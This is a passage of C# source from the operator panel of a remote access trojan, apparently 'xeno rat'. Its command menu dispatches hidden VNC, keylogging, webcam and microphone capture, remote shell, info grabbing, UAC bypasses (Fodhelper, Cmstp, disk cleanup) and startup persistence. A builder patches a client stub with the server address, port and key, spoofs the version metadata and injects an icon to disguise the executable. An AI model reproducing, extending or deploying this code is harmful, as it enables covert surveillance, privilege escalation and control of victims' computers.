                MessageBox.Show("Error with WebCam!" + e.Message);
            }
        }
        private async Task DisplayMsgBox(Node client, string messageBox_text) 
        {
            Node subClient = await client.CreateSubNodeAsync(2);
            bool worked = await Utils.LoadDllAsync(subClient, "Fun", File.ReadAllBytes("plugins\\Fun.dll"), AddLog);
            if (!worked)
            {
                MessageBox.Show("Error Starting Fun dll!");
                return;
            }
            byte[] data = Encoding.UTF8.GetBytes(messageBox_text);
            await subClient.SendAsync(new byte[] { 1 });
            await subClient.SendAsync(data);
            await Task.Delay(1000);
            subClient.Disconnect();
        }
        private async Task StartMessageBox(Node client)
        {
            try
            {
                string messageBox_text=Interaction.InputBox("Message that will display", "MessageBox", "");
                if (string.IsNullOrEmpty(messageBox_text)) 
                {
                    return;
                }
                await DisplayMsgBox(client, messageBox_text);
            }
            catch
            {
                MessageBox.Show("Error with Fun dll!");
            }
        }
        private async Task StartFunMenu(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Fun", File.ReadAllBytes("plugins\\Fun.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Fun dll!");
                    return;
                }
                Application.Run(new Forms.FunMenu(subClient));
                subClient.Disconnect();
            }
            catch
            {
                MessageBox.Show("Error with FunMenu Form!");
            }
        }
        private async Task StartStartup(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Startup", File.ReadAllBytes("plugins\\Startup.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Startup dll!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 0 });
                bool Startupworked=(await subClient.ReceiveAsync())[0]==1;
                if (Startupworked)
                {
                    MessageBox.Show("File added to startup!");
                }
                else 
                { 
                    MessageBox.Show("Failed to add to startup!");
                }
                subClient.Disconnect();
            }
            catch
            {
                MessageBox.Show("Error with Startup dll!");
            }
        }
        private async Task StartRemoveStartup(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Startup", File.ReadAllBytes("plugins\\Startup.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Startup dll!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 1 });
                MessageBox.Show("Startup removed!");
                subClient.Disconnect();
            }
            catch
            {
                MessageBox.Show("Error with Startup dll!");
            }
            
        }
        private async Task StartClose(Node client) 
        {
            await client.SendAsync(new byte[] { 2 });
            await Task.Delay(1000);
            client.Disconnect();
        }
        private async Task StartRelaunch(Node client)
        {
            await client.SendAsync(new byte[] { 3 });
            await Task.Delay(1000);
            client.Disconnect();
        }
        private async Task StartUninstall(Node client)
        {
            await client.SendAsync(new byte[] { 4 });
            await Task.Delay(1000);
            client.Disconnect();
        }
        private async Task StartShutdown(Node client) 
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "SystemPower", File.ReadAllBytes("plugins\\SystemPower.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting SystemPower dll!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 1 });
                await Task.Delay(1000);
                subClient.Disconnect();
            }
            catch
            {
                MessageBox.Show("Error with SystemPower dll!");
            }
        }
        private async Task StartRestart(Node client) 
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "SystemPower", File.ReadAllBytes("plugins\\SystemPower.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting SystemPower dll!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 2 });
                await Task.Delay(1000);
                subClient.Disconnect();
            }
            catch
            {
                MessageBox.Show("Error with SystemPower dll!");
            }
        }

        private async Task StartDebugInfo(Node client) 
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                if (subClient==null)
                {
                    MessageBox.Show("Error connecting socket");
                    return;
                }
                Application.Run(new Forms.DebugInfo(subClient));
                subClient.Disconnect();
            }
            catch
            {
                MessageBox.Show("Error with Debug Form!");
            }
        }

        private void StartPlugin(Func<Node, Task> func, Node client) 
        {
            Task.Run(() => func(client));
        }
        private void StartPluginSTA(Func<Node, Task> func, Node client)
        {
            Thread t = new Thread(async () => await func(client));
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
        }
        public void OnMenuClick(object sender, ToolStripItemClickedEventArgs e)
        {
            Node client = (Node)((ToolStripMenuItem)sender).Tag;
            string command = e.ClickedItem.Text;
            MenuClick(client, command);
        }
        public void MenuClick(Node client, string command) 
        {
            if (command == "Chat")
            {
                StartPlugin(StartChat, client);
            }
            else if (command == "Hvnc")
            {
                StartPlugin(StartHvnc, client);
            }
            else if (command == "Reverse proxy")
            {
                StartPlugin(StartReverseProxy, client);
            }
            else if (command == "Process Manager")
            {
                StartPlugin(StartProcessManager, client);
            }
            else if (command == "File Manager")
            {
                StartPlugin(StartFileManager, client);
            }
            else if (command == "Registry Manager")
            {
                StartPlugin(StartRegistryManager, client);
            }
            else if (command == "Live Microphone")
            {
                StartPlugin(StartLiveMicrophone, client);
            }
            else if (command == "Shell")
            {
                StartPlugin(StartShell, client);
            }
            else if (command == "WebCam")
            {
                StartPlugin(StartWebCam, client);
            }
            else if (command == "Key Logger")
            {
                StartPlugin(StartKeyLogger, client);
            }
            else if (command == "Offline Key Logger")
            {
                StartPlugin(StartOfflineKeyLogger, client);
            }
            else if (command == "Windir + Disk Cleanup")
            {
                StartPlugin(StartWinDirBypass, client);
            }
            else if (command == "Cmstp")
            {
                StartPlugin(StartCmstpUacBypass, client);
            }
            else if (command == "Fodhelper")
            {
                StartPlugin(StartFodHelperBypass, client);
            }
            else if (command == "Request admin")
            {
                StartPlugin(StartRequestForAdmin, client);
            }
            else if (command == "De-escalate to user")
            {
                StartPlugin(StartDeescalateperms, client);
            }
            else if (command == "Screen Control")
            {
                StartPlugin(StartScreenControl, client);
            }
            else if (command == "InfoGrab")
            {
                StartPluginSTA(StartInfoGrab, client);
            }
            else if (command == "BlueScreen")
            {
                StartPlugin(StartBlueScreen, client);
            }
            else if (command == "Message Box")
            {
                StartPlugin(StartMessageBox, client);
            }
            else if (command == "Fun Menu")
            {
                StartPlugin(StartFunMenu, client);
            }
            else if (command == "Startup")
            {
                StartPlugin(StartStartup, client);
            }
            else if (command == "Remove Startup")
            {
                StartPlugin(StartRemoveStartup, client);
            }
            else if (command == "Close")
            {
                StartPlugin(StartClose, client);
            }
            else if (command == "Relaunch")
            {
                StartPlugin(StartRelaunch, client);
            }
            else if (command == "Uninstall")
            {
                StartPlugin(StartUninstall, client);
            }
            else if (command == "Shutdown")
            {
                StartPlugin(StartShutdown, client);
            }
            else if (command == "Restart")
            {
                StartPlugin(StartRestart, client);
            }
            else if (command == "Debug") 
            {
                StartPlugin(StartDebugInfo, client);
            }
            Console.WriteLine(command);

        }
        private void LaunchContext(Node client)
        {
            ContextMenuStrip contextMenu = new ContextMenuStrip();
            foreach (string k in Commands.Keys.ToArray())
            {
                ToolStripMenuItem menuItem = new ToolStripMenuItem(k);
                foreach (string v in Commands[k]) 
                {
                    menuItem.DropDownItems.Add(v);
                }
                menuItem.Tag = client;
                menuItem.DropDownItemClicked += new ToolStripItemClickedEventHandler(OnMenuClick);
                contextMenu.Items.Add(menuItem);
            }
            contextMenu.Show(Cursor.Position);
        }
        private void listView2_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                ListViewItem focusedItem = listView2.FocusedItem;
                if (focusedItem != null && focusedItem.Bounds.Contains(e.Location))
                {
                    LaunchContext((Node)focusedItem.Tag);
                }
            }
        }
        public static void SetEncryptionKey(ModuleDefMD module, byte[] EncryptionKey)
        {
            string typeName = "xeno_rat_client.Program";
            string methodName = ".cctor";
            int instructionIndex = 9;
            TypeDef type = module.Find(typeName, isReflectionName: true);
            MethodDef method = type?.FindMethod(methodName);
            if (method?.Body != null)
            {
                Instruction instruction = method.Body.Instructions[instructionIndex];
                Array.Resize(ref EncryptionKey, 32);
                ((FieldDef)instruction.Operand).InitialValue = EncryptionKey;
            }
        }
        public static void SetServerIp(ModuleDefMD module, string ip)
        {
            string typeName = "xeno_rat_client.Program";
            string methodName = ".cctor";
            int instructionIndex = 2;
            TypeDef type = module.Find(typeName, isReflectionName: true);
            MethodDef method = type?.FindMethod(methodName);
            if (method?.Body != null)
            {
                Instruction instruction = method.Body.Instructions[instructionIndex];
                instruction.Operand = ip;
            }
        }
        public static void SetServerPort(ModuleDefMD module, int port)
        {
            string typeName = "xeno_rat_client.Program";
            string methodName = ".cctor";
            int instructionIndex = 4;
            TypeDef type = module.Find(typeName, isReflectionName: true);
            MethodDef method = type?.FindMethod(methodName);
            if (method?.Body != null)
            {
                Instruction instruction = method.Body.Instructions[instructionIndex];
                instruction.Operand = port;
            }
        }
        public static void SetDelay(ModuleDefMD module, int delay)
        {
            string typeName = "xeno_rat_client.Program";
            string methodName = ".cctor";
            int instructionIndex = 12;
            TypeDef type = module.Find(typeName, isReflectionName: true);
            MethodDef method = type?.FindMethod(methodName);
            if (method?.Body != null)
            {
                Instruction instruction = method.Body.Instructions[instructionIndex];
                instruction.Operand = delay;
            }
        }
        public static void SetMutex(ModuleDefMD module, string mutex)
        {
            string typeName = "xeno_rat_client.Program";
            string methodName = ".cctor";
            int instructionIndex = 14;
            TypeDef type = module.Find(typeName, isReflectionName: true);
            MethodDef method = type?.FindMethod(methodName);
            if (method?.Body != null)
            {
                Instruction instruction = method.Body.Instructions[instructionIndex];
                instruction.Operand = mutex;
            }
        }
        public static void SetStartup(ModuleDefMD module, bool dostartup)
        {
            if (!dostartup) return;
            string typeName = "xeno_rat_client.Program";
            string methodName = ".cctor";
            int instructionIndex = 16;
            TypeDef type = module.Find(typeName, isReflectionName: true);
            MethodDef method = type?.FindMethod(methodName);
            if (method?.Body != null)
            {
                Instruction instruction = method.Body.Instructions[instructionIndex];
                instruction.Operand = 1;
            }
        }
        public static void SetInstallenv(ModuleDefMD module, string env)
        {
            string typeName = "xeno_rat_client.Program";
            string methodName = ".cctor";
            int instructionIndex = 18;
            TypeDef type = module.Find(typeName, isReflectionName: true);
            MethodDef method = type?.FindMethod(methodName);
            if (method?.Body != null)
            {
                Instruction instruction = method.Body.Instructions[instructionIndex];
                instruction.Operand = env;
            }
        }
        public static void SetStartupName(ModuleDefMD module, string name)
        {
            string typeName = "xeno_rat_client.Program";
            string methodName = ".cctor";
            int instructionIndex = 20;
            TypeDef type = module.Find(typeName, isReflectionName: true);
            MethodDef method = type?.FindMethod(methodName);
            if (method?.Body != null)
            {
                Instruction instruction = method.Body.Instructions[instructionIndex];
                instruction.Operand = name;
            }
        }
        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                if (label16.Text.Contains(":") && !File.Exists(label16.Text)) 
                {
                    MessageBox.Show("could not find the icon, please pick another!");
                }

                SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.Filter = "Executable files (*.exe)|*.exe";
                saveFileDialog.Title = "Save File";
                saveFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                if (saveFileDialog.ShowDialog() != DialogResult.OK)
                {
                    return;
                }
                AddLog("Building client...", Color.Blue);
                string filePath = saveFileDialog.FileName;
                ModuleDefMD module = ModuleDefMD.Load("stub\\xeno rat client.exe");
                SetEncryptionKey(module, Utils.CalculateSha256Bytes(textBox14.Text));
                SetServerIp(module, textBox12.Text);
                SetServerPort(module, int.Parse(textBox13.Text));
                SetMutex(module, textBox15.Text);
                SetDelay(module, int.Parse(textBox2.Text));
                SetStartup(module, checkBox1.Checked);
                if (checkBox2.Checked)
                {
                    SetInstallenv(module, "appdata");
                }
                else if (checkBox3.Checked) 
                {
                    SetInstallenv(module, "temp");
                }
                if (checkBox1.Checked && textBox16.Text.Replace(" ","")!="") 
                {
                    SetStartupName(module, textBox16.Text);
                }

                module.Write(filePath);
                module.Dispose();
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(filePath);
                versionResource.FileVersion = textBox4.Text;
                versionResource.ProductVersion = textBox3.Text;
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["ProductName"] = textBox6.Text;
                stringFileInfo["FileDescription"] = textBox7.Text;
                stringFileInfo["CompanyName"] = textBox8.Text;
                stringFileInfo["LegalCopyright"] = textBox9.Text;
                stringFileInfo["LegalTrademarks"] = textBox10.Text;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["OriginalFilename"] = textBox11.Text;
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;

                versionResource.SaveTo(filePath);
                if (label16.Text.Contains(":"))
                {
                    IconInjector.InjectIcon(filePath, label16.Text);
                }
                AddLog("Client built!", Color.Green);
                MessageBox.Show("File saved!");
            }
            catch (Exception ex)
            {
                AddLog("Client build failed!", Color.Red);
                MessageBox.Show("An error has occurred: "+ex.Message);
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "ICO files (*.ico)|*.ico";
            openFileDialog.Title = "Open ICO File";
            openFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            if (openFileDialog.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            label16.Text= openFileDialog.FileName;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            label16.Text = "No Icon Selected";
        }

        private void button5_Click(object sender, EventArgs e)
        {
            label17.Text = "Current Password: "+ textBox5.Text;
            string_key = textBox5.Text;
            key = Utils.CalculateSha256Bytes(textBox5.Text);
        }

        private void listView2_ClientSizeChanged(object sender, EventArgs e)
        {

        }

        private void tabPage5_Click(object sender, EventArgs e)
        {

        }

        private void textBox8_TextChanged(object sender, EventArgs e)
        {

        }

        private void label10_Click(object sender, EventArgs e)
        {

        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            textBox16.Enabled = checkBox1.Checked;
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox3.Checked) 
            {
                checkBox3.CheckedChanged -= checkBox3_CheckedChanged;
                checkBox3.Checked = false;
                checkBox3.CheckedChanged += checkBox3_CheckedChanged;
            }
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox2.Checked)
            {
                checkBox2.CheckedChanged -= checkBox2_CheckedChanged;
                checkBox2.Checked = false;
                checkBox2.CheckedChanged += checkBox2_CheckedChanged;
            }
        }

        private void listView4_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                ContextMenuStrip contextMenu = new ContextMenuStrip();

                // Define the context menu items locally
                string[] contextMenuItems = new string[]
                {
                    "Start OfflineKeylogger",
                    "Infograber",
                };

                foreach (string menuItemText in contextMenuItems)
                {
                    ToolStripMenuItem menuItem = new ToolStripMenuItem(menuItemText);
                    contextMenu.Items.Add(menuItem);

                    menuItem.Click += (sender1, e1) =>
                    {
                        if (!listView4.Items.Cast<ListViewItem>().Any(item => item.Text == menuItemText))
                        {
                            OnConnectTasks.Add(menuItemText);
                            listView4.Items.Add(menuItemText);
                        }
                    };
                }

                ListViewItem itemUnderMouse = listView4.GetItemAt(e.X, e.Y);

                if (itemUnderMouse != null)
                {
                    ToolStripMenuItem removeItem = new ToolStripMenuItem("Remove");
                    contextMenu.Items.Add(removeItem);
                    removeItem.Click += (sender1, e1) =>
                    {
                        OnConnectTasks.Remove(itemUnderMouse.Text);
                        listView4.Items.Remove(itemUnderMouse);
                    };
                }

                contextMenu.Show((Control)sender, e.Location);
            }
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void listView3_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void listView3_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right && listView3.SelectedItems.Count > 0)
            {
                string selectedValue = listView3.SelectedItems[0].SubItems[0].Text+": "+ listView3.SelectedItems[0].SubItems[1].Text; 
                
                ContextMenu contextMenu = new ContextMenu();
                MenuItem copyMenuItem = new MenuItem("Copy");
                copyMenuItem.Click += (s, args) => Clipboard.SetText(selectedValue);
                contextMenu.MenuItems.Add(copyMenuItem);

                contextMenu.Show(listView3, e.Location);
            }
        }

        private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {
            LogErrors = checkBox4.Checked;
        }
    }
    public static class IconInjector
    {

        [SuppressUnmanagedCodeSecurity()]
        private class NativeMethods
        {
            [DllImport("kernel32")]
            public static extern IntPtr BeginUpdateResource(string fileName,
                [MarshalAs(UnmanagedType.Bool)] bool deleteExistingResources);

            [DllImport("kernel32")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool UpdateResource(IntPtr hUpdate, IntPtr type, IntPtr name, short language,
                [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 5)] byte[] data, int dataSize);

            [DllImport("kernel32")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool EndUpdateResource(IntPtr hUpdate, [MarshalAs(UnmanagedType.Bool)] bool discard);
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct ICONDIR
        {

            public ushort Reserved;

            public ushort Type;

            public ushort Count;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct ICONDIRENTRY
        {

            public byte Width;

            public byte Height;

            public byte ColorCount;

            public byte Reserved;

            public ushort Planes;

            public ushort BitCount;

            public int BytesInRes;

            public int ImageOffset;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct BITMAPINFOHEADER
        {
            public uint Size;
            public int Width;
            public int Height;
            public ushort Planes;
            public ushort BitCount;
            public uint Compression;
            public uint SizeImage;
            public int XPelsPerMeter;
            public int YPelsPerMeter;
            public uint ClrUsed;
            public uint ClrImportant;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 2)]
        private struct GRPICONDIRENTRY
        {
            public byte Width;
            public byte Height;
            public byte ColorCount;
            public byte Reserved;
            public ushort Planes;
            public ushort BitCount;
            public int BytesInRes;
            public ushort ID;
        }

        public static void InjectIcon(string exeFileName, string iconFileName)
        {
            InjectIcon(exeFileName, iconFileName, 1, 1);
        }

        public static void InjectIcon(string exeFileName, string iconFileName, uint iconGroupID, uint iconBaseID)
        {
            const uint RT_ICON = 3u;
            const uint RT_GROUP_ICON = 14u;
            IconFile iconFile = IconFile.FromFile(iconFileName);
            var hUpdate = NativeMethods.BeginUpdateResource(exeFileName, false);
            var data = iconFile.CreateIconGroupData(iconBaseID);
            NativeMethods.UpdateResource(hUpdate, new IntPtr(RT_GROUP_ICON), new IntPtr(iconGroupID), 0, data,
                data.Length);
            for (int i = 0; i <= iconFile.ImageCount - 1; i++)
            {
                var image = iconFile.ImageData(i);
                NativeMethods.UpdateResource(hUpdate, new IntPtr(RT_ICON), new IntPtr(iconBaseID + i), 0, image,
                    image.Length);
            }
            NativeMethods.EndUpdateResource(hUpdate, false);
        }

        private class IconFile
        {
            private ICONDIR iconDir = new ICONDIR();
            private ICONDIRENTRY[] iconEntry;

            private byte[][] iconImage;

            public int ImageCount
            {
                get { return iconDir.Count; }
            }

            public byte[] ImageData(int index)
            {
                return iconImage[index];
            }

            public static IconFile FromFile(string filename)
            {
                IconFile instance = new IconFile();

                byte[] fileBytes = System.IO.File.ReadAllBytes(filename);

                GCHandle pinnedBytes = GCHandle.Alloc(fileBytes, GCHandleType.Pinned);

                instance.iconDir = (ICONDIR)Marshal.PtrToStructure(pinnedBytes.AddrOfPinnedObject(), typeof(ICONDIR));

                instance.iconEntry = new ICONDIRENTRY[instance.iconDir.Count];
                instance.iconImage = new byte[instance.iconDir.Count][];

                int offset = Marshal.SizeOf(instance.iconDir);

                var iconDirEntryType = typeof(ICONDIRENTRY);
                var size = Marshal.SizeOf(iconDirEntryType);
                for (int i = 0; i <= instance.iconDir.Count - 1; i++)
                {

                    var entry =
                        (ICONDIRENTRY)
                            Marshal.PtrToStructure(new IntPtr(pinnedBytes.AddrOfPinnedObject().ToInt64() + offset),
                                iconDirEntryType);
                    instance.iconEntry[i] = entry;

                    instance.iconImage[i] = new byte[entry.BytesInRes];
                    Buffer.BlockCopy(fileBytes, entry.ImageOffset, instance.iconImage[i], 0, entry.BytesInRes);
                    offset += size;
                }
                pinnedBytes.Free();
                return instance;
            }

            public byte[] CreateIconGroupData(uint iconBaseID)
            {

                int sizeOfIconGroupData = Marshal.SizeOf(typeof(ICONDIR)) +
                                          Marshal.SizeOf(typeof(GRPICONDIRENTRY)) * ImageCount;
                byte[] data = new byte[sizeOfIconGroupData];
                var pinnedData = GCHandle.Alloc(data, GCHandleType.Pinned);
                Marshal.StructureToPtr(iconDir, pinnedData.AddrOfPinnedObject(), false);
                var offset = Marshal.SizeOf(iconDir);
                for (int i = 0; i <= ImageCount - 1; i++)
                {
                    GRPICONDIRENTRY grpEntry = new GRPICONDIRENTRY();
                    BITMAPINFOHEADER bitmapheader = new BITMAPINFOHEADER();
                    var pinnedBitmapInfoHeader = GCHandle.Alloc(bitmapheader, GCHandleType.Pinned);
                    Marshal.Copy(ImageData(i), 0, pinnedBitmapInfoHeader.AddrOfPinnedObject(),
                        Marshal.SizeOf(typeof(BITMAPINFOHEADER)));
                    pinnedBitmapInfoHeader.Free();
                    grpEntry.Width = iconEntry[i].Width;
                    grpEntry.Height = iconEntry[i].Height;
                    grpEntry.ColorCount = iconEntry[i].ColorCount;
                    grpEntry.Reserved = iconEntry[i].Reserved;
                    grpEntry.Planes = bitmapheader.Planes;
                    grpEntry.BitCount = bitmapheader.BitCount;
                    grpEntry.BytesInRes = iconEntry[i].BytesInRes;
                    grpEntry.ID = Convert.ToUInt16(iconBaseID + i);
                    Marshal.StructureToPtr(grpEntry, new IntPtr(pinnedData.AddrOfPinnedObject().ToInt64() + offset),
                        false);
                    offset += Marshal.SizeOf(typeof(GRPICONDIRENTRY));
                }
                pinnedData.Free();
                return data;
            }
        }
    }
}
